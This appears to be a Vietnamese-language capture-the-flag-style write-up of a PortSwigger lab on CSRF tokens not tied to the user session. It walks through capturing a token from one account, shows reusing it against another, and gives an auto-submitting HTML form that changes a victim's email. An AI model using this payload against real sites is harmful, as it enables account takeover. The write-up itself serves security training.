@@ -1,0 +1,34 @@
+CSRF - CSRF where token is not tied to user session
+
+End Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
+wiener:peter
+carlos:montoya
+
+Analystic
+---------
+Bước 1: Mở trình duyệt Burp, truy cập url của lab sau đó đăng nhập vào wiener:peter
+Bước 2: Thực hiện đổi email của wiener, ta thấy có 1 request như sau:
+POST /my-account/change-email HTTP/2
+Host: 0ac8001504ea1fdf803e086400df0009.web-security-academy.net
+.....
+email=123%40gmail.com&csrf=LcycFzjsMZfshqgKLIJt14wQjjIhKxVj
+từ request này, ta có được 1 số thông tin:
+method: POST
+endpoint: /my-account/change-email
+ta thấy gói tin có 2 giá trị: email và csrf, nếu xóa csrf này ta sẽ nhận được thông báo "missing parameter csrf"
+nếu ta thay đổi method từ POST thành GET, thì bị thông báo "Method Not Allowed"
+Bước 3: tuy nhiên lab cho ta 2 tài khoản để đăng nhập, ta thực hiện đăng nhập vào wiener trước, sau đó copy csrf của csrf nhưng không được sử dụng 
+Sau đó đăng nhập vào carlos, thực hiện đổi email của carlos nhưng thay giá trị csrf bằng csrf của wiener đã lưu trước đó và thực hiện thử gửi --> ta thấy email của carlos đã bị thay đổi
+--> csrf không gắn với phiên của người dùng, nhưng lại chỉ sử dụng được 1 lần --> ta có thể lợi dụng lỗ hổng này, đăng nhập vào 1 tài khoản dưới quyền kiểm soát, sau đó lấy csrf của tài khoản đó để thực hiện tấn công csrf với những tài khoản khác để đổi email nhằm đổi mật khẩu của tài khoản 
+Bước 4: Ta truy cập vào expolit server và thực hiện mô phỏng lại gói tin với nội dung của phần body như sau:
+<html>
+<body>
+<form action="URL của lab login với carlos" method="POST">
+<input type="hidden" name="email" value="tmt123@gmail.com">
+<input type="hidden" name="csrf" value="csrf ta đã lưu của wiener">
+</form>
+<script> document.forms[0].submit();</script>
+</body>
+</html>
+--> Khi người dùng nhận được gói tin này, trang web vẫn sẽ chấp nhận dù nó từ 1 trang web dưới sự kiểm soát của attacker vì nó có chứa csrf hợp lệ của lab, khi người dùng nhận được, web sẽ tự động gửi 1 form gồm email của attacker và csrf của attacker sau đó thay đổi email của victim.
